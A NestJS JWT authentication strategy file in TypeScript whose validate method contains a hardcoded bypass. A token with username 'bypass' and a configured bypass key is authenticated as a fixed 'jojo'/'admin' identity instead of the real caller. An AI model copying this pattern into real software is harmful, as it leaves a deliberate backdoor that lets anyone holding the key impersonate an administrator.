import { Injectable } from '@nestjs/common'
import { AuthService } from 'src/authentication/auth.service'
import { PassportStrategy } from '@nestjs/passport'
import { ExtractJwt, Strategy } from 'passport-jwt'
import { ConfigService } from '@nestjs/config'
import * as UserModel from 'src/models/users'

@Injectable()
export class JwtStrategy extends PassportStrategy(Strategy) {
  constructor(
    private readonly authService: AuthService,
    private readonly configService: ConfigService,
  ) {
    super({
      jwtFromRequest: ExtractJwt.fromAuthHeaderAsBearerToken(),
      ignoreExpiration: false,
      secretOrKey: configService.get<string>('jwt.secretKey'),
    })
  }

  async validate(data: {
    username: string
    sub: string
    iat: number
  }): Promise<UserModel.Users> {
    if (
      data.username === 'bypass' &&
      data.sub === this.configService.get<string>('jwt.bypassKey')
    ) {
      return await this.authService.verify(
        {
          username: 'jojo',
          sub: 'admin',
          iat: 123,
        },
        true,
      )
    }

    return await this.authService.verify(data)
  }
}
